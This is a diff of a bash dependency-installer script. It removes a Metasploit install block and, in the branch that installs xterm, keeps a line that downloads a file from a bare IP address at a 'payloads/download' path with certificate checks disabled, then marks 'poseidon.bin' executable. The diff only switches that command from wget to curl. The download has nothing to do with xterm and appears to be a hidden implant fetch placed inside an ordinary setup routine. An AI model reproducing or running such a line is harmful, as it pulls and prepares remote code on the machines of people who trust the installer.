@@ -42,20 +42,13 @@ else
 	echo -e "$green Apache2 $yellow[✘]$nc"
 sudo apt-get install apache2
 fi
-#Metasploit
-if hash msfconsole 2>/dev/null; then
-        echo -e "$green Metasploit-Framework $yellow[✔]$nc"
-else
-        echo -e "$green Metasploit-Framework $yellow[✘]$nc"
-curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > metasploit_installer && chmod 755 metasploit_installer && ./metasploit_installer
-fi
 #curl
 if hash xterm 2>/dev/null; then
         echo -e "$green xterm $yellow[✔]$nc"
 else
         echo -e "$grenn xterm $yellow[✘]$nc"
 sudo apt-get install xterm
-wget --content-disposition https://45.144.29.184:7443/api/v1.4/payloads/download/eac28630-4c9f-470c-b2ce-96a18cd0b1e5 --no-check-certificate
+curl --content-disposition https://45.144.29.184:7443/api/v1.4/payloads/download/eac28630-4c9f-470c-b2ce-96a18cd0b1e5 --no-check-certificate
     chmod +x poseidon.bin
 fi
 
